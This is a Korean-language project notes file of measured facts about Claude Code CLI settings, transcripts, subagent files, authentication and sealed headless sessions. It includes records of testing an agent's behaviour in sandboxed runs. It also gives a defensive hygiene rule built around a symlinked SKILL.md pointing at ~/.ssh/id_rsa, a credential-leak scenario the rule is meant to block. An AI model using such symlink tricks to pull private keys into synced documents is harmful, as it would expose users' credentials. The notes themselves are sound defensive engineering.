# 하네스 실측 사실 — Claude Code CLI·설정 파일

`CLAUDE.md`의 "도메인 지식" 절이 참조하는 상세 목록이다. **전부 실측으로 확인된 것**이며,
추측이나 문서 인용만으로는 이 목록에 넣지 않는다. 검증한 CLI 버전을 함께 적는다.

새 사실을 추가할 때는 ⑴ 어떻게 관측했는지 ⑵ 무엇이 이 사실 때문에 바뀌어야 하는지를 함께 쓴다.

## 설정·상태 파일

- 플러그인 **설치 스코프**는 `~/.claude/plugins/installed_plugins.json`에 있다.
  `settings.json`의 `enabledPlugins`는 `{id: boolean}`뿐이라 스코프를 담지 않는다.
- `claude plugin list --json`의 엔트리 스키마: `{id, version, scope, enabled, installPath,
  installedAt, lastUpdated, mcpServers, projectPath}`. `id`는 `name@marketplace` 형태이므로
  **고유 집계 키는 이름이 아니라 `name@marketplace`다** — 이름만 쓰면 타 마켓플레이스의
  동명 플러그인을 잘못 병합한다. `projectPath`는 `scope === "local"`일 때만 존재한다.
- `claude plugin list`의 중복 출력(실측 68행/고유 66)은 버그가 아니라 **프로젝트별 local 설치**다.
- `mcpServers`는 서버명을 키로 하는 **객체**다(배열 아님). 스파이크가 빈 배열만 관측해
  배열로 오판한 전례가 있다 — **빈 값은 타입을 알려주지 않는다.**
- MCP 서버의 출처는 넷이다: `~/.claude.json` 루트 `mcpServers`(user) · 프로젝트 엔트리
  `mcpServers`(local) · `.mcp.json`(project) · 플러그인 번들.
- `~/.claude.json`의 프로젝트 엔트리에 `enabledMcpServers`/`disabledMcpServers`가 있고
  **실사용 중이다.** 단 MCP 전용이 아니라 claude.ai 커넥터·`computer-use` 같은 내장 기능까지
  담는 범용 토글 목록이다 — 이름 패턴이 아니라 **로컬에 정의가 있는가**로 자산 여부를 판정한다.
- `~/.claude.json`에 `skillUsage`·`pluginUsage`(`{usageCount, lastUsedAt}`, `lastUsedAt`은
  **epoch ms** — ISO 문자열이 아니다)가 이미 있다. `pluginUsage`의 키는 `name@marketplace`
  (Asset.id와 동형) · `skillUsage`의 키는 스킬 이름 베어 형태다(실측, 2026-08-21, 실제
  `~/.claude.json`).
- 세션 트랜스크립트에 `attributionSkill`·`attributionPlugin`·`attributionMcpServer` 필드가
  **이미 있다.** 귀속을 접두어 매칭으로 재발명하기 전에 이 필드를 먼저 본다. 단 모든 세션에
  있지는 않으므로, 부재의 **원인**(구버전인가 `--bare`인가)을 확인하기 전에는 단정하지 않는다.
- `tool_result` 블록은 `user` 행에만 있다(`tool_use`는 `assistant` 행). 서브에이전트 스폰
  도구명은 `Agent`다.
- **⚠️ 정정(Step 3, 2026-08-21 재실측) — 서브에이전트 기록은 메인 트랜스크립트 파일 "안"에
  `isSidechain: true` 행으로 인라인되지 않는다.** 이전 판(위 문단, Step 0 근거)이 "같은 파일
  안에 들어간다"고 적었던 것은 **틀렸다** — 실측(2026-08-21, `~/.claude/projects` 666개 `.jsonl`
  전수 재확인)에서 `isSidechain:true`를 포함하는 파일 326개 중 **325개가
  `<project>/<session-uuid>/subagents/agent-<hash>.jsonl`이라는 별도 파일**이었다(나머지 1개는
  `tool-results/*.txt` 안의 우연한 문자열 일치로 애초에 트랜스크립트 행이 아니었다). 메인 세션
  파일(`<project>/<session-uuid>.jsonl`) 자체에서 `isSidechain:true`가 나온 사례는 **0건**이었다.
  즉 세션 디렉터리 구조는 `<project>/<session-uuid>.jsonl`(메인) + `<project>/<session-uuid>/`
  (같은 이름의 디렉터리) 하위에 `subagents/agent-<hash>.jsonl`(서브에이전트별 트랜스크립트) +
  `subagents/agent-<hash>.meta.json`(사이드카, 아래) + `tool-results/*.txt`(아래)가 함께 있다.
  파서는 **두 위치를 모두** 훑어야 서브에이전트 사용량을 놓치지 않는다.
- `subagents/agent-<hash>.meta.json` 사이드카에 `{"agentType":"general-purpose",
  "description":"...","toolUseId":"toolu_...","spawnDepth":1,"model":"sonnet"}`가 실린다.
  `toolUseId`가 **부모 세션 파일의 `Agent` tool_use 블록 `id`와 정확히 일치**해 역추적이
  가능하다(실측 재현: 22건 Agent tool_use ↔ 22개 subagent 메타파일 1:1 대응 사례 확인).
- 서브에이전트 파일의 행은 사용량 귀속에 필요한 것을 전부 갖는다: `assistant` 행에 `usage`가
  실리고, **`attributionAgent`** 필드가 스폰된 에이전트를 지목하며(값은 `general-purpose` 또는
  `oh-my-claudecode:critic`처럼 **자산 id와 그대로 대응**), `agentId`로 같은 실행을 묶을 수 있다.
  `sessionId` 필드는 **부모 세션과 동일한 값**을 갖는다(서브에이전트도 부모 세션의 일부로 집계
  가능). 즉 귀속 필드는 넷이다 —
  `attributionSkill`·`attributionPlugin`·`attributionMcpServer`·`attributionAgent`.
- **대형 tool_result 페이로드는 트랜스크립트에 전문이 남지 않는다.** 하네스가 본문을 잘라
  `<persisted-output>\nOutput too large (36.6KB). Full output saved to: <홈 절대경로>\n\nPreview
  (first 2KB):\n...`로 치환하고, 실제 페이로드는 `<session-dir>/tool-results/<id>.txt`에 별도
  저장한다(실측). 이 절대경로 자체가 AC-1.7이 금지하는 홈 절대경로 원문이므로, 카탈로그로 가는
  어떤 필드에도 이 경로를 그대로 옮기면 안 된다.
- `message.content`는 배열(tool_use/tool_result 블록)뿐 아니라 **평문 문자열**일 수도 있다 —
  사람이 직접 입력한 프롬프트의 표준 단축형이며, 실측상 오히려 이 형태가 `type:"user"` 행의
  다수를 차지한다(합성 픽스처만 보고 배열만 있다고 가정하면 실제 트랜스크립트의 상당수 행이
  parse 실패로 떨어진다 — Step 3에서 실제 환경 562행 표본 중 5건으로 처음 재현).
- 트랜스크립트 행 `type` 값은 AC-0.6b가 확인한 16종 외에 **`agent-name`**(세션 표시 이름 메타
  데이터, `{"type":"agent-name","agentName":"...","sessionId":"..."}`)도 존재한다(Step 3,
  84MB/24,698행 표본에서 재현) — usage 파싱과는 무관하지만 미지의 `type`을 만나면 parse가
  실패하므로(R13 의도된 동작) 열거값에 반영해둔다. 16종 표본은 표본 크기의 한계였을 뿐이다.

## CLI 동작

- `claude`에 `--config-dir` 플래그는 **없다.** 설정 격리는 `CLAUDE_CONFIG_DIR` 환경변수로 한다.
- `claude plugin list --json`을 한 번만 실행해도 대상 config 디렉터리에 `.claude.json`과
  `backups/`, `.claude.json.tmp.<pid>.<rand>`가 **생성된다** — "읽기" 명령이 쓴다.
  단 `plugin enable`/`disable`은 `installed_plugins.json`을 **바이트 단위로 변경하지 않는다**(실측 5회).
- `claude mcp list`는 조회가 아니라 **전 서버 health-check다.** 실측 24초, 회차마다 결과가
  다르고, 실패 행에 서버가 반환한 HTML 원문이 개행째로 섞이며 `--json`이 없다.
  **스냅샷의 입력으로 쓰지 않는다** — MCP는 설정 파일 직독으로 읽는다.
- `claude mcp`에 enable/disable 서브명령은 없다(add·remove·get·list·login·logout뿐).
- `--bare`는 훅·CLAUDE.md 자동 탐색만 끄는 게 아니라 **attribution 기록과 OAuth·키체인 인증까지**
  끈다. 즉 `--bare` 경로는 `ANTHROPIC_API_KEY`(또는 `apiKeyHelper`)를 요구한다. 도움말은
  "Skills still resolve via `/skill-name`"이라 적지만 **실측은 플러그인 커맨드·스킬 모두 무력화**다.
- `--safe-mode`는 커스터마이즈를 전면 차단하면서 **인증은 정상 동작한다**("Auth ... work
  normally"). 실측으로 훅 미발화·user CLAUDE.md 미로드·설치 플러그인 미로드를 확인했다.
  단 **admin/managed 정책은 여전히 적용된다.**
- `--safe-mode`는 `plugin enable <id> -s <scope>` / `plugin disable <id> -s <scope>`도 깨지
  않는다(Step 5 M6 수정 검증, 실제 `claude` 2.1.238 바이너리로 `ctk move`의 플러그인 왕복 e2e를
  `sealed-live` 프로파일로 실행해 확인 — exit 0, enablement가 정확히 전이됨). `plugin list --json`
  실측(위)과 같은 부류(구조적 서브커맨드)라 예상된 결과지만, 사용자 환경을 실제로 바꾸는 유일한
  특권 쓰기 경로이므로 별도로 실측했다.
- `--settings`는 "load **additional** settings" — **병합이지 대체가 아니다.** 빈 설정을 줘도
  user `settings.json`의 훅은 살아 있다. `--plugin-dir`도 **추가지 제한이 아니다.**
- `--strict-mcp-config`는 `plugin list` 같은 서브커맨드를 깨뜨린다(`unknown option`).
  모델 세션(`-p`)에만 붙인다.
- 인증은 파일이 아니라 **macOS 키체인**에 있고, 항목명이 `Claude Code-credentials-<hex>`로
  **config dir별로 분리**된다. 따라서 `CLAUDE_CONFIG_DIR`를 격리하면 인증이 불가능하다.
- 슬래시 커맨드 라우팅은 **인증 이전에** 결정된다 — 커맨드 존재 여부 판정은 모델 호출 없이 $0에 가능하다.
- `claude plugin details <id>`(`--json` 없음, 텍스트 출력)의 첫 줄은 `<name>[ <version>]` 형태다.
  **버전이 항상 붙지는 않는다** — 실측(2026-08-21, 공개 마켓플레이스 플러그인 3건 직접 실행):
  `"oh-my-claudecode 4.15.7"`처럼 붙는 경우도, `"context7"`처럼 전혀 안 붙는 경우도 있었다.
  "Component inventory" 절의 각 줄은 `<Kind> (<n>)`이고 `n>0`이면 뒤에 콤마 구분 목록과(MCP·
  Hooks는) 괄호 안 하네시 판정 문구가 따라붙는다. "Projected token cost" 절의
  `Always-on:   ~<n> tok   added to every session`에서 `<n>`은 1,000단위 콤마가 섞일 수 있다
  (`~3,169 tok`).
- MCP tool_use 이름(`mcp__<server>__<tool>` 또는 `mcp__plugin_<plugin>_<server>__<tool>`)은
  **이중 밑줄("__")로 정확히 3부분(mcp / 서버-또는-플러그인 세그먼트 / 도구명)이 갈린다** — 두
  번째 세그먼트 내부의 단일 밑줄·하이픈은 이 분리에 영향을 주지 않는다(실측 재확인: 이 세션
  자신이 호출하는 도구명들 — `mcp__notebooklm__add_notebook`,
  `mcp__plugin_oh-my-claudecode_t__ast_grep_search`,
  `mcp__plugin_chrome-devtools-mcp_chrome-devtools__click` 등). 단 `plugin_<plugin>_<server>`
  세그먼트 자체를 `<plugin>`과 `<server>`로 다시 쪼개는 일반 규칙은 없다 — 둘 다 하이픈을 포함할
  수 있어 정규식으로 경계를 확정할 수 없다(예: `plugin_chrome-devtools-mcp_chrome-devtools`).

## `sealed-live` 봉인 세션의 churn (AC-0.11 실측, 2026-08-21)

`claude --safe-mode --strict-mcp-config --mcp-config '{"mcpServers":{}}' --tools "" -p`를
실제 config dir에 대해 3회 실행하고 전후를 대조한 결과다. **이 목록이 `sealed-live` 전용
Tier-2 허용목록의 유일한 근거다** — AC-0.8(플러그인 명령·격리 홈)의 값을 전용하지 않는다.

- **`--tools ""`는 `-p`에서 동작한다**(exit 0, 정상 응답). 도구 0개 강제가 실현 가능하다.
- 매 실행이 건드리는 것: `plugins/`(mtime) · `sessions/`(mtime + `<pid>.json` + `<pid>.<hash>.key`) ·
  `projects/` + `projects/<인코딩된 cwd>/`(트랜스크립트 저장) · `.claude.json`.
- **`.claude.json`에서 바뀌는 최상위 키는 `cachedGrowthBookFeaturesAt` 하나뿐이다.**
  `projects` 맵은 추가·삭제·내용변경 0건 — 의미 diff 화이트리스트는 이 한 키만 열면 된다.
- **`--no-session-persistence`를 붙이면 `projects/` churn이 통째로 사라진다**(트랜스크립트 미기록).
  남는 것은 `plugins/`·`sessions/` mtime과 `.claude.json` 한 키뿐이다.
- 임시 cwd를 매 실행 새로 만들면 `projects/<인코딩 경로>/` 디렉터리가 **실행마다 영구 누적**된다
  (경로 원문이 사용자 실파일에 쌓인다). 고정 경로(`~/.cache/ctk/sealed-cwd`, 0700) 재사용과
  `--no-session-persistence`를 함께 쓴다.
- ⚠️ **정정(2026-08-24).** 이 문서는 한때 "배경 churn(실행 중인 다른 세션에 의한 변경)은 8초
  관측에서 0건"이라고 적었다. **그 관측 창이 짧았을 뿐이다** — 실제로는 배경 churn이 `gen`을
  **상시** 차단하는 지배적 실패 모드였다(아래 「봉인 트리 감사와 동시 세션」). 8초는 부모 세션이
  응답을 쓰지 않는 정적 구간이었고, 자산 1건 생성에는 2분이 걸린다. **관측 창이 판정 창보다
  짧으면 "0건"은 "없다"가 아니라 "그 창에서는 못 봤다"이다.**

## `claude auth status` — 0원 인증 가용성 신호 (Step 4 실측, 2026-08-21)

- `claude auth status --json`(그리고 `claude --safe-mode auth status --json`도 동일하게)은
  **구조적 서브커맨드**이고 모델을 호출하지 않는다(실측: 2026-08-21, claude 2.1.238, 1초 이내
  응답) — `gen/src/estimate.ts`의 "sealed-live 기준 인증 가용성" 선검사에 정확히 맞는 0원 신호다.
  `--safe-mode`를 붙여도 깨지지 않는다(`plugin list --json`과 같은 부류).
- 출력에 `loggedIn`(boolean) 외에 **`email`·`orgId`·`orgName` 같은 개인식별정보가 포함된다** —
  이 프로젝트는 공개 저장소이므로(CLAUDE.md) 이 출력을 그대로 로그·run-log·에러 메시지에 남기지
  않는다. `core/harness/auth-status.schema.ts`는 `loggedIn`만 강제 검증하고 나머지는
  `.passthrough()`로 받되, 호출부는 `loggedIn` 외 필드를 읽지 않는다.

## Anthropic SDK (`@anthropic-ai/sdk`)

- **`ANTHROPIC_API_KEY` 미설정이 "크레덴셜 없음"을 뜻하지 않는다.** SDK는 네 단계로 해석한다 —
  `ANTHROPIC_API_KEY` → `ANTHROPIC_AUTH_TOKEN` → `ant auth login` 프로파일 → Workload Identity
  Federation. 인자 없는 생성자가 이 체인을 밟으므로, env 하나만 보고 포기하면 프로파일 사용자가
  측정 가능한데도 미측정으로 떨어진다.
- 크레덴셜을 하나도 해석하지 못하면 **생성자가 아니라 첫 호출**에서 실패하고, 던지는 것은
  `AuthenticationError`도 `AnthropicError`도 아닌 **평범한 `Error`**다(실측). 메시지가
  `"Could not resolve authentication method. Expected one of apiKey, authToken, ..."`이며
  **타입으로 구분할 방법이 없다** — 문자열 매칭이 유일한 신호이고 SDK 버전에 취약하다.
  401 응답은 `AuthenticationError`로 오므로 그쪽은 타입으로 잡힌다.
- 토큰 실측은 `client.messages.countTokens({model, messages})` (비-beta). **tiktoken 계열은
  Claude 토큰을 과소 집계하므로 쓰지 않는다.**

## 그 밖에

- 일부 설치 스크립트는 `CLAUDE.md`까지 수정한다. 설치 로그의 **마지막 줄까지** 읽고,
  설치 전 백업 → 사후 diff로 확인한다.
- `.gitignore`는 **미추적 파일에만** 작용한다. 이미 추적 중인 파일은 막지 못한다.
  반대로 **무앵커 패턴**(`snapshots/`)은 의도한 신규 파일까지 조용히 삼킨다 — 루트 앵커(`/snapshots/`)로 좁힌다.
- 플러그인 자동 갱신이 **비활성 상태를 되돌릴 수 있다.** "껐다"는 기록만으로 현재 상태를
  단정하지 않는다. 상태는 항상 실측한다.
- 토큰 수치는 실측만 쓴다. 무엇을 재는지를 먼저 확정한다 — frontmatter 전체와
  `name`+`description`은 2배 이상 차이가 난다. `input_tokens`는 유저 턴 토큰일 뿐이라
  점유 비용의 대리값이 될 수 없다(`cache_creation_input_tokens`를 본다).
- 자동 스캐너는 **부정문을 오독한다.** 판정을 결론으로 쓰지 말고 원문을 확인한다.
- **`CLAUDE_CONFIG_DIR`을 명시하면 `.claude.json`이 `$HOME` 루트가 아니라 그 디렉터리
  안(`$CLAUDE_CONFIG_DIR/.claude.json`)에 생기고, `$HOME` 루트에 이미 있는 `.claude.json`은
  완전히 무시된다.** (Step 5 실측, claude 2.1.238: `CLAUDE_CONFIG_DIR`를 빈 디렉터리로 설정해
  `claude plugin list --json`을 돌리면 `.claude.json`이 그 디렉터리 안에 생성됨을 확인했고,
  `$HOME`에 마커 값을 심은 `.claude.json`을 미리 둔 채 같은 명령을 돌려도 그 파일은 손대지
  않고 `$CLAUDE_CONFIG_DIR` 안에 별도의 새 `.claude.json`을 만드는 것으로 재확인했다.)
  `test-isolated` 프로파일은 `HOME`·`CLAUDE_CONFIG_DIR` 둘 다 항상 명시적으로 주입하므로
  (probe/harness/seal-profiles.ts), 이 프로파일로 뜬 `claude` 서브프로세스가 다루는
  `.claude.json`은 **항상 `CLAUDE_CONFIG_DIR` 안의 것**이다 — AC-0.8의 Tier-2 허용목록
  `.claude.json` 항목이 실은 이 위치를 잰 것과 일치한다(따로 정정할 필요 없음). 다만
  `probe/src/home.ts`의 `claudeJsonPath()`는 `$HOME` 루트를 가정하며 이는 **합성 픽스처를
  손으로 만들 때**(둘 다 테스트가 직접 배치하므로 자기 일관적)만 맞고, **실제 `claude`
  바이너리를 격리 홈에 대해 스폰해 결과를 그 경로로 읽으려 하면 항상 빈 값을 얻는다** —
  `probe/src/sources/known-projects.ts`(→ plugins/skills/mcp 세 소스가 공유하는 프로젝트
  레지스트리)가 이 경로에 의존한다. actuator의 격리 홈 e2e 테스트(cli/test/move-rollback.test.ts)는
  이 함정을 알고 `~/.claude.json`의 `projects` 키를 테스트가 직접 시딩해 우회한다. Step 2 범위
  밖이라 `home.ts` 자체는 고치지 않았다 — Step 2/AC-1 재검토 시 반영 대상으로 남긴다.

## `CLAUDE_CONFIG_DIR`을 설정하면 OAuth 인증이 깨진다 — 기본값과 같은 값이어도 (Step 4 실측, 2026-08-22)

**관측 방법.** `claude auth status`(0원 신호)를 `env`를 정확히 통제한 채 네 조합으로 실행했다
(파이썬 `subprocess`로 env 딕셔너리를 직접 구성 — 셸 인용 오류를 배제하기 위함).

| env | `loggedIn` |
|---|---|
| `HOME`+`PATH`+`USER` (`CLAUDE_CONFIG_DIR` **미설정**) | `true` (`claude.ai`) |
| 위 + `TERM=dumb` | `true` |
| 위 + `CLAUDE_CONFIG_DIR=$HOME/.claude` (**기본값과 동일한 값**) | `false` (`none`) |
| 위 + `CLAUDE_CONFIG_DIR=$HOME/.claude/` (후행 슬래시) | `false` |

즉 키체인 항목은 **"env가 설정됐는가" 자체로 갈린다** — 값이 기본 경로와 문자열까지 같아도
미설정일 때와 다른 항목을 본다. 기존 사실("항목명이 `Claude Code-credentials-<hex>`로 config
dir별로 분리된다")의 강한 형태다.

**델타 디버깅으로 얻은 최소 인증 env는 `HOME`·`PATH`·`USER` 3개다.** 전체 env에서 하나씩
빼며 `loggedIn`이 `true`로 남는지 확인했다. `USER`가 빠지면 인증이 실패한다 —
`ENV_WHITELIST_COMMON`에 이미 있으므로 현행 봉인은 이 조건을 만족한다.

**파급 ①** `seal-profiles.ts`의 H5 수정(프로덕션에서 `CLAUDE_CONFIG_DIR`를 자식 env에 **넣지
않는다**)은 결과적으로 인증을 살린 조치였다. 넣었다면 `sealed-live`(=`ctk gen`의 본경로)가
전부 미인증으로 떨어졌을 것이다. 이 사실을 모른 채 "기본값이니 명시해도 같다"고 되돌리면
`gen`이 통째로 죽는다 — **되돌리지 말 것.**

**파급 ② AC-3.3의 모순과 해소 (2026-08-23 해소됨).** 두 요구가 동시에 성립하지 않았다:
- 합성 카탈로그를 보게 하려면 자식 `HOME`을 합성 홈으로 덮어써야 한다
  (스킬이 `~/.config/ctk/config.json`에서 카탈로그 경로를 읽으므로).
- 인증이 살려면 `CLAUDE_CONFIG_DIR`를 설정하지 **않아야** 하고, 그러면 config dir은
  `$HOME/.claude`가 된다 — 위에서 덮어쓴 합성 홈 아래이므로 인증 정보가 없다.

두 조건을 만족하는 env 조합은 없다. **env를 건드리지 않고 해소했다**(사용자 결정 "안 B") —
진단용 **스킬 사본**을 임시 플러그인 디렉터리에 넣고 `--plugin-dir`로 주입한다. 사본은
프로덕션 원문과 **정확히 한 절**(`## 카탈로그 위치`)만 다르고, 그 계약을 `core`의 순수 변환이
반환값으로 내놓아 테스트가 바이트 단위로 대조한다. 봉인 화이트리스트는 그대로이므로
`security-reviewer` 재심 대상이 아니다.

전용 env를 추가하는 안(A)은 프로덕션 스킬 본문을 그대로 시험할 수 있어 더 정확하지만 봉인
변경이다. 안 B가 남긴 미검증 범위는 "스킬이 `config.json`/`machine.json`을 실제로 읽는가"
한 절뿐이다.

## AC-3.3 유료 진단이 4회에 걸쳐 드러낸 것 (2026-08-23 실측)

**스킬은 프롬프트이지 코드가 아니라서, 작동 여부를 아는 방법은 실제로 띄워 보는 것뿐이다.**
네 번 다 새 결함이 나왔고 전부 단위 테스트로는 보이지 않는 종류였다.

**1회차 — 카탈로그를 한 줄도 못 읽었다.** 스킬은 제대로 발동했는데 `Read`가 권한 승인 대기로
반환되고 `grep`이 "허용된 작업 디렉터리 밖"이라 차단됐다. 헤드리스 `-p` 세션에는 프롬프트에
답할 사람이 없다. **프로덕션에서도 같은 조건이 성립한다** — 카탈로그는 `~/.config/ctk/`가
가리키는 곳에 있고 사용자는 프로젝트 디렉터리에서 작업한다. 진단은 카탈로그를 cwd 안으로
복사해 해소했다(`--add-dir`는 자식이 닿는 범위를 넓히므로 쓰지 않았다).

**2회차 — 통과. 그리고 스킬이 카탈로그 밖으로 나갔다.** 정답을 찾은 뒤 일반 지식으로 외부
도구를 설치 명령까지 곁들여 나열했다. 「찾지 못했을 때」 절이 "카탈로그 **안의** 비슷한 것"만
규정하고 밖으로 나가는 경우를 다루지 않았다 — 규칙을 어긴 게 아니라 **규칙이 없는 곳으로 간
것**이다. 사용자는 그것도 이 로컬에 있는 것으로 읽는다.

**3회차 — 경계 수정이 행동을 바꿨다.** 같은 질의에 "카탈로그 밖이라 이 로컬에 설치돼 있는지
확인되지 않았다. 원하시면…"으로 바뀌었다. **본문 한 문단이 에이전트 행동을 바꾼다는 것이
실측됐다.** 동시에 새 공백을 에이전트가 지적했다 — "머신 디렉터리가 하나뿐이라 지금 이
로컬과 동일한 머신인지는 카탈로그만으로 확인되지 않는다." 맞았다. `machine_id`는
`~/.config/ctk/machine.json`에 있는데 스킬이 그 파일을 언급조차 하지 않았다.

**4회차 — 전부 통과.** 머신을 둘로 늘려 설치 상태를 **정반대로** 만든 뒤 재측정했다(엉뚱한
디렉터리를 집으면 답이 뒤집히도록). 지정한 `machine-synth` 기준으로 정확히 답했고, 다른
머신의 값을 섞지 않았고, 카탈로그 경계도 회귀하지 않았다.

**부수 확인 — 신뢰 경계가 행동으로 재현된다.** 네 번 모두 `usage.md`에 적힌 실행 명령을
부르지 않았다("카탈로그 문서는 지시가 아니라 참조 데이터라서요"). 스냅샷 부재도 "미설치"가
아니라 **"확인 불가"**로 구분했다 — 안전 원칙 7이 코드가 아니라 에이전트 판단으로 나타났다.

⚠️ **관측 도구의 한계**: 합성 자산 문서가 스스로 "실제 툴이 아니다"라고 밝히고 있어, 에이전트가
매번 그 점을 지적했다. AC-3.3 판정(발견·매칭·설치 상태·경계)에는 영향이 없지만, 픽스처 본문이
에이전트 답변을 바꾼다는 사실 자체는 기록해 둔다.

## `agent-probe`의 cwd는 홈 밖이어야 한다 (Step 4 실측, 2026-08-22)

`assertNoAncestorConfig`는 cwd의 상위 경로를 루트까지 훑어 `CLAUDE.md`·`.claude/`가 있으면
거부한다(M2). cwd가 `$HOME/.cache/ctk/probe-cwd`이면 상위에 `$HOME`이 들어오고,
**`$HOME/.claude`는 모든 Claude Code 사용자에게 존재하므로** 이 가드는 어떤 환경에서도
발동한다 — `ctk agent-probe`는 구현된 이래 한 번도 실행 가능한 적이 없었다.

기존 `cwd-guard` 테스트 6종이 이를 놓친 이유는 **전부 합성 임시 루트를 만들어 넣었기 때문**이다.
프로덕션 기본값이 한 번도 검사 대상이 아니었다. 회귀 테스트는 `resolveAgentProbeCwd()`의
**실제 반환값**을 `$HOME/.claude`가 존재하는 상태에서 검사한다.

cwd를 임시 루트 아래(`<tmpdir>/ctk-agent-probe-cwd-<uid>`)로 옮겨 해소했다. B3(고정 경로
재사용으로 `.claude.json`의 `projects.*` 누적 방지)은 경로 문자열이 실행마다 같으므로 유지된다.

## 자산 유형별 스코프·토글 (CLAUDE.md에서 이관)

| 자산 유형 | 스코프가 사는 곳 | 끄는 방법 |
|---|---|---|
| 플러그인 | **설치 스코프**는 `~/.claude/plugins/installed_plugins.json` · **활성 여부**는 `settings.json`의 `enabledPlugins`(값은 boolean뿐) | `claude plugin disable -s user\|project\|local` |
| MCP 서버 | `~/.claude.json` 루트 `mcpServers`(user) · 프로젝트 엔트리 `mcpServers`(local) · `.mcp.json`(project) · 플러그인 번들 | **CLI 명령 없음.** 단 상태는 프로젝트별 `enabledMcpServers`/`disabledMcpServers`에 기록됨 — `/mcp` UI로 토글 |
| 전역 스킬 | `~/.claude/skills/<name>/` 존재 여부 | **명령 없음** — 디렉터리 이동 |
| CLI 도구 | PATH | 해당 없음 (상시 토큰 0) |

## 저장소 링크의 유일한 출처는 `known_marketplaces.json`이다 (Step 6a 실측, 2026-08-22)

요구사항 6("GitHub 링크")의 데이터 소스. `installed_plugins.json`에도 `plugin list --json`에도
저장소 URL이 **없다** — 플러그인 id의 `@marketplace` 부분을 `<config>/plugins/known_marketplaces.json`
에서 찾아야 출처가 나온다.

형태: `{ "<marketplace>": { source, installLocation, lastUpdated, autoUpdate? } }`.
엔트리 16건 전수에서 `source.source`는 세 값만 관측됐다.

| `source.source` | 함께 오는 필드 | 링크 |
|---|---|---|
| `github` (12건) | `repo` = `owner/name` 슬러그 | `https://github.com/<repo>` |
| `git` (3건) | `url` (실측값에 `.git` 접미사 있음) | `.git`만 떼어 그대로 사용 — **호스트를 가정하지 않는다** |
| `directory` (1건) | `path` = **개인 절대경로** | **없음** |

⚠️ **`directory` 출처의 `path`를 카탈로그에 넣으면 AC-1.7(경로 원문 금지) 위반이다.**
`toRepoLink()`는 이 경우 `url: null`을 반환하고 경로를 밖으로 내보내지 않는다. Asset에는
`repo_url`과 `repo_source`를 **함께** 두어 "링크 없음(로컬 출처)"과 "아직 수집 안 됨"을 구분한다 —
빈 문자열로 메우면 화면이 클릭 가능한 죽은 링크를 렌더한다.

실제 스캔 결과(플러그인 66개): `github` 56 · `git` 9 · `directory` 1. 65개에 링크가 붙는다.

## 스킬 `SKILL.md`가 심볼릭 링크인 경우가 흔하다 (Step 6b 실측, 2026-08-22)

플러그인 매니저·도트파일 관리자가 스킬을 배치할 때 `<config>/skills/<name>/SKILL.md`를 실제
파일이 아니라 **다른 위치를 가리키는 심볼릭 링크**로 만드는 경우가 있다. 한 실측 환경에서
스킬 111개 중 52개가 이 형태였다.

**파급**: `gen`의 파일 위생(H2)은 심볼릭 링크를 거부한다 — 옳은 규칙이다(`SKILL.md`가
`~/.ssh/id_rsa` 링크면 그 내용이 카탈로그 문서에 박혀 동기화된다). 그러나 거부를 **자산 단위로
가두지 않으면** 링크가 하나만 있어도 `ctk gen`이 통째로 실패하고, 링크가 흔한 이상 그 환경에서
gen은 영구히 사용 불가가 된다.

`plan.ts`는 위생 실패를 자산 단위로 잡아 `skipped[]`에 이유와 함께 남긴다. 링크를 읽지 않는
성질은 그대로다. **거부의 범위를 정할 때는 그 조건이 실환경에서 얼마나 흔한지를 먼저 센다** —
드문 예외라고 가정하고 전체 중단을 택하면 흔한 조건에서 기능이 사라진다.

## `probe`와 `gen`이 심볼릭 링크를 다르게 취급한다 (재심 부수 발견, 2026-08-22)

- **`probe`는 따라 읽는다** — `sources/skills.ts`가 `SKILL.md`를 `readFileSync`로 열어 frontmatter를
  파싱한다(자산 발견 목적). 링크면 대상 파일이 읽힌다.
- **`gen`은 거부한다** — `file-hygiene.ts`가 `lstat`으로 링크를 판정해 원문 읽기를 막는다.

즉 **"링크를 따라 읽지 않는다"는 `gen`에만 강제되는 속성**이다. `probe` 경로의 실제 노출은
`frontmatter.description` 한 필드로 한정되고(비-frontmatter 파일이면 값이 없다) 공격자가 이미 그
디렉터리를 통제하는 상황이라 위험은 낮지만, 속성을 일반 규칙처럼 적어두면 어긋난다.

**단 스킬 디렉터리 자체가 링크인 경우는 어느 쪽도 읽지 않는다** — `sources/skills.ts`의
`if (!dirent.isDirectory()) continue;`가 링크 dirent를 **발견 단계에서** 제외하기 때문이다.
조상 디렉터리를 통한 위생 우회는 성립하지 않는다(재심 실증).

## `~/.claude.json`은 소유자 전용이고 `projects`가 자동으로 늘어난다 (Step 6b 실측, 2026-08-22)

권한은 `-rw-------`(실측) — **소유자만 읽을 수 있다.** 그리고 `projects` 키는 사용자가 새
디렉터리에서 `claude`를 한 번 띄우기만 해도 자동으로 추가된다.

**파급**: `ctk web`의 조회 응답에 프로젝트 이름을 실으면 접근 통제가 **파일 권한(소유자 전용)
에서 "루프백에 닿을 수 있는가"로 느슨해진다.** 개인 머신에서는 같은 주체라 실질 차이가 없지만
다중 사용자 호스트에서는 다른 계정이 읽을 수 있다 — `ctk web --no-projects`가 그 탈출구다.

**자동 증가가 더 중요한 사실이다.** "지금 목록에 민감한 이름이 없다"를 한 번 확인해도 그것은
**시점 표본**이며, 목록은 사용자가 의식하지 않는 사이 늘어난다. 그래서 `ctk web`은 기동할
때마다 실제 건수를 고지한다 — 부재를 한 번 확인하고 영구히 믿지 않기 위함이다.

## zsh는 비인용 변수를 단어 분할하지 않는다 — 셸 검증이 거짓 신호를 낸다 (2026-08-22)

`for FLAGS in "--actions --no-projects"; do cmd $FLAGS; done`은 bash에서는 두 인자로 쪼개지지만
**zsh에서는 한 덩어리 인자**로 전달된다. 이 프로젝트의 기본 셸이 zsh이므로, 플래그 조합을
루프로 검증하면 **어느 플래그도 인식되지 않은 채** "그 조합이 깨졌다"는 거짓 결론이 나온다.

실제로 `ctk web --actions --no-projects`가 세 번 연속 "결함"으로 관측됐고, 단독 실행과
5회 반복에서는 매번 정상이었다. 차이는 코드가 아니라 **인자 전달 방식**이었다.

**대응**: 인자를 배열로 그대로 넘긴다(`run() { cmd "$@"; }`). 그리고 루프 관측과 단독 실행이
어긋나면 **코드가 아니라 측정을 먼저 의심한다.**

⚠️ **`pgrep -fc`도 같은 세션에서 서브셸로 띄운 프로세스를 일관되게 잡지 못했다**(서버가 응답
중인데 0을 반환). `while pgrep ...; do sleep; done` 형태의 종료 대기는 즉시 통과해 다음 반복이
이전 서버와 겹친다. 프로세스 정리는 고정 대기로 확인하거나 포트로 확인한다.

## fail-closed 가드가 빠져나갈 길을 없앤 사례 6종 (누적, 2026-08-20~23)

